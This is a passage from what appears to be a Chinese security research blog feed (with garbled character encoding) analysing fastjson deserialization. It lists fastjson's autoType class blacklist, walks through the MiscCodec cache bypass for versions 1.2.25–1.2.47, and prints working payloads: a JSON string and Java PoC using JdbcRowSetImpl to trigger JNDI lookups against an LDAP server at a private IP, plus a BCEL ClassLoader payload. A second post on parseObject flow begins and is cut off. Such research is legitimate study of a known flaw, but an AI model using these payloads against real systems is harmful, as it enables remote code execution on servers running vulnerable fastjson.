class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>ä»¥åŠä¸€ä¸ªç™½åå•ï¼Œç”±å¼€å‘è€…è‡ªè¡Œæ·»åŠ ï¼Œé»˜è®¤ä¸ºç©ºã€‚åˆ¤æ–­é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœautoTypeSupportå¼€å¯ï¼Œåˆ™å…ˆéå†ç™½åå•ï¼Œå¦‚æœåœ¨å…¶ä¸­ï¼Œåˆ™ç›´æ¥åŠ è½½ç±»ï¼Œå¦åˆ™éå†é»‘åå•ï¼Œå¦‚æœåœ¨å…¶ä¸­åˆ™æŠ›å¼‚å¸¸ï¼ˆautoTypeSupporté»˜è®¤ä¸ºfalseï¼‰</li><li>getClassFormMappingä»ç¼“å­˜ä¸­è·å–ååºåˆ—åŒ–å™¨ï¼Œ å¹¶ä»ååºåˆ—åŒ–å™¨ä¸­åŠ è½½ç±»</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008160408520.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008160408520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li><p>å¦‚æœautoTypeSupport &#x3D;&#x3D; falseï¼Œåˆ™å…ˆéå†é»‘åå•ï¼Œå¦‚æœåœ¨åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œç„¶åéå†ç™½åå•ï¼Œå¦‚æœåœ¨åˆ™ç›´æ¥åŠ è½½</p></li><li><p>æœ€åå¦‚æœä¸Šé¢ä¸¤ä¸ªéƒ½æ²¡åŠ è½½åˆ°ç±»ï¼Œå¹¶ä¸”autoTypeSupportå¼€å¯ï¼Œåˆ™è°ƒç”¨åŸæ¥çš„TypeUtils.loadClassåŠ è½½ç±»ã€‚</p></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008155838490.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008155838490.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç½‘ä¸Šè¯´çš„å‰é¢åŠ <code>L</code>åé¢åŠ <code>;</code>çš„ç»•è¿‡æ–¹å¼ï¼Œé€‚ç”¨äºautoTypeSupportå¼€å¯çš„æƒ…å†µï¼Œä½†å®é™…ä¸Šæ ¹æœ¬æ²¡è¿™ç§ç¯å¢ƒï¼Œæœ‰æ²¡æœ‰æ›´é€šç”¨çš„åŠæ³•å‘¢ï¼Ÿ</p><h2 id="MiscCodec"><a href="#MiscCodec" class="headerlink" title="MiscCodec"></a>MiscCodec</h2><p>å”¯ä¸€çš„å…¥å£å°±æ˜¯getClassFromMappingï¼Œç›´æ¥ç»™è§£æ³•ï¼š</p><p>åœ¨ParserConfigåˆå§‹åŒ–çš„æ—¶å€™ï¼Œå‘é‡Œé¢putäº†ä¸€å †keyä¸ºclassï¼Œvalueä¸ºååºåˆ—åŒ–æ„é€ å™¨çš„Entry</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008171713109.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008171713109.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœä¼ å…¥çš„typeNameæ˜¯Class.classï¼Œåˆ™è·å–çš„ååºåˆ—åŒ–æ„é€ å™¨ä¸ºMiscCodecï¼Œå¹¶æŒ‰æ­£å¸¸æµç¨‹ï¼Œè°ƒç”¨deserializeå¯¹å§</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172534594.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172534594.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨deserializeæ–¹æ³•æ—¶ï¼ŒMiscCodec.deserializeä¼šè¿›å…¥ä¸‹é¢è¿™ä¸ªifï¼Œå¦‚æœstrValä¸ºæˆ‘ä»¬ä¼ è¿›å»çš„æ¶æ„ç±»ï¼Œæ¯”å¦‚ldapç”¨çš„<code>com.sun.rowset.JdbcRowSetImpl</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172141862.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172141862.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¼šæŠŠç»“æœputè¿›mappings</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172732991.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172732991.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹‹åå†èµ°åˆ°checkAutoTypeåŠ è½½BasicDataSourceæ—¶ï¼Œç”¨getClassFromMappingçœ‹ç›´æ¥æœ‰æ²¡æœ‰åŠ è½½è¿‡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172804551.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172804551.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>äºæ˜¯è¿”å›äº†åŠ è½½è¿‡çš„æ¶æ„ç±»ç»“æœ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172904352.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172904352.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ€ä¹ˆè®¾ç½®strValå‘¢ï¼ŸstrValæ¥è‡ªobjVal</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008173126844.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008173126844.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>objValæ¥è‡ªparser.parse()ï¼Œå¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯â€valâ€ï¼Œåˆ™ç”¨lexer.nextToken()ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªæ ‡è®°ï¼Œè°ƒç”¨parser.acceptç¡®ä¿å½“å‰ç¬¦å·ä¸ºå†’å·ï¼Œparser.parse()è§£æå®é™…çš„å¯¹è±¡å€¼ï¼Œèµ‹ç»™objVal</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008184519145.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008184519145.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆ©ç”¨<code>&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</code>å³å¯æŠŠobjValè®¾ç½®ä¸ºVal</p><p>å®Œæˆç»•è¿‡</p><p>JSONå­—ç¬¦ä¸²ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ldap:your-ldapServer&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span> <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JDNI POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl_1_2_41</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://172.22.112.1:8085/YAxwlVoO\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒç†ï¼Œæ”¹é€ çš„BCELèƒ½ç”¨å—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL_parse_1_2_47</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\Runtime_static.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bcel</span> <span class="operator">=</span> <span class="string">&quot;\&quot;&quot;</span>+<span class="string">&quot;$$BCEL$$&quot;</span>+ Utility.encode(code,<span class="literal">true</span>)+<span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;aaa\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: &quot;</span>+ bcel+ <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;bbb\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç‰ˆæœ¬ä¸å‡ºç½‘ç”¨ä¸äº†BCELï¼Œå› ä¸ºBasicDataSourceåµŒå¥—äº†ClassLoaderåˆ©ç”¨ï¼Œè€Œä¸”ä¸èƒ½ä¼ ä¸¤ä¸ªjava.lang.Classï¼Œåˆ†æå¦‚ä¸‹ï¼š</p><p>å¿«è¿›åˆ°çœ‹mappingsï¼Œå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªéƒ½putè¿›Mappingsäº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008193606175.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008193606175.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨åŠ è½½ClassLoaderç±»æ—¶ï¼Œç”±äºexpectClassç»è¿‡äº†ç¬¬ä¸€æ¬¡è¢«ç½®ä¸ºClassç±»ï¼Œç¬¬äºŒæ¬¡å°±å–åˆ°äº†exceptClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008194307899.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008194307899.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>äºæ˜¯checTypeSupporté‡Œï¼Œèµ°è¿›äº†ç¬¬ä¸€ä¸ªifï¼ŒClassLoaderåœ¨é»‘åå•ï¼Œäºæ˜¯ç›´æ¥G</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008194203623.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008194203623.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>1.2.24èƒ½æ‰“JNDIå’Œä¸å‡ºç½‘BCELï¼Œ1.2.25-1.2.47åªèƒ½æ‰“å‡ºç½‘çš„JNDI</p><p>BCELæ‰“å†…å­˜é©¬&#x3D;ä¿®æ”¹æœ¬åœ°ç»„ä»¶åŠŸèƒ½ï¼Œé€šè¿‡è¾¾åˆ°ä¸å‡ºç½‘åˆ©ç”¨ä¸”å›æ˜¾çš„æ‰‹æ³•</p><p>ç½‘ä¸Šæµä¼ çš„1.2.25+ç‰ˆæœ¬æ‰“BCELéƒ½æ˜¯éª—å­ï¼Œæˆ‘é‰´å®šè¿‡äº†ï¼Œä¸€ä¸ªè…¾è®¯äº‘çš„ä¸€ä¸ªfreebufçš„ï¼Œè‡ªå·±éƒ½è·‘ä¸é€šè¿˜æ¥éª—</p><p>é«˜ç‰ˆæœ¬åˆ©ç”¨ï¼š<a href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></p><p>ä»¥åå­¦äº†groovyå†çœ‹</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> BCEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson parseObjectåˆ†æ(çº¯æµç¨‹æ— POC)</title>
      <link href="/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/"/>
      <url>/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/</url>
      
        <content type="html"><![CDATA[<p>FastJson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒ javaBean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° javabean</p><p>ç‰¹ç‚¹å°±æ˜¯å¿«ï¼Œæ€§èƒ½å¥½ï¼Œä¹Ÿå°±æ˜¯å› ä¸ºæ­¤ï¼ŒFastJson ä½¿ç”¨çš„ç”¨æˆ·ç‰¹åˆ«å¤šã€‚ä½†æ˜¯å¼€æºç»„ä»¶+ç”¨æˆ·å¤§çš„ç‰¹ç‚¹ï¼Œä¸€æ—¦çˆ†å‡ºæ¼æ´ï¼Œå±å®³ä¹Ÿæ˜¯å·¨å¤§çš„</p><p>ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ‰“ä¸Šè¿™ä¸ªä¾èµ–ï¼Œåé¢éœ€è¦æ¢çš„æ—¶å€™å†æ¢</p><h1 id="FastJsonè§£ææµç¨‹åˆ†æ"><a href="#FastJsonè§£ææµç¨‹åˆ†æ" class="headerlink" title="FastJsonè§£ææµç¨‹åˆ†æ"></a>FastJsonè§£ææµç¨‹åˆ†æ</h1><p>å›ºå®šæ•°æ®çš„fastjsonè§£æï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(json);</span><br><span class="line">    System.out.println(jsonObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parseObjectæŠŠå­—ç¬¦ä¸²ä½œä¸ºjsonè§£æ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241002182315369.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241002182315369.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿå¯ä»¥ç»™parseObjectä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œè®©ä»–æŒ‰æŒ‡å®šçš„ç±»è¿›è¡Œè¿˜åŸï¼Œä½†è¦æ±‚personæ˜¯ä¸€ä¸ªjavabeanï¼Œå¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(json,person.class);</span><br></pre></td></tr></table></figure><p>åœ¨jsonå­—ç¬¦ä¸²è¿˜åŸæˆpersonç±»çš„è¿‡ç¨‹ä¸­ï¼Œæ€ä¹ˆç»™å­—æ®µparam1,param2èµ‹å€¼çš„å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯è°ƒç”¨personç±»çš„setter</p><p>ç›®å‰ä¸ºæ­¢ä»£ç è¿˜æŒºæ­£å¸¸ï¼Œä½†æ˜¯jsonä¸­åŠ å…¥äº†ä¸€ä¸ªå¥‡æ€ªçš„åŠŸèƒ½ï¼Œjsonä¼ å…¥çš„<code>@type</code>èƒ½æŒ‡å®šä»¥æŸç§ç±»è¿›è¡Œè¿˜åŸï¼Œå¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.exploit.othercase.Person\&quot;,\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>å…¶åŠŸèƒ½ç­‰æ•ˆäº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(json, Person.class);</span><br><span class="line">    System.out.println(jsonObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£çœ‹çœ‹parseObjectç©¶ç«Ÿå¹²äº†ä»€ä¹ˆ</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>å‡è®¾æœ‰Personè¿™ä¸ªjavabean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.othercase;</span><br><span class="line"></span><br><span class="line"><span class="comment">//javabean using in fastjsoncase</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person Constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String param1;</span><br><span class="line">    <span class="keyword">private</span> String param2;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParam1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getParam1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> param1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParam1</span><span class="params">(String param1)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setParam1&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.param1 = param1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParam2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getParam2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> param2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParam2</span><span class="params">(String param2)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setParam2&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.param2 = param2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨@typeçš„æ–¹å¼æ¥è¿˜åŸ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.expoilt.othercase.Person\&quot;,\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(json);</span><br><span class="line">System.out.println(jsonObject);</span><br></pre></td></tr></table></figure><p>åœ¨è¾“å‡ºå¯ä»¥çœ‹åˆ°ï¼Œä¾æ¬¡è°ƒç”¨äº†æ„é€ å‡½æ•°ã€setterã€getter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003102916658.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003102916658.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é…±ç´«è°ƒç”¨ï¼Ÿé‚£ä¸æ˜¯ç›´æ¥èƒ½æ‰“TemplatesImplï¼Œæœ‰CCçš„è¯TrAXFilterä¸æ˜¯ä¹Ÿéšä¾¿æ‰“ï¼Ÿ</p><p><code>JSON.parseObject(json);</code>å¤„æ‰“ä¸ªæ–­ç‚¹çœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿</p><p>parseObjectè°ƒç”¨äº†parse</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003103253948.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003103253948.png" 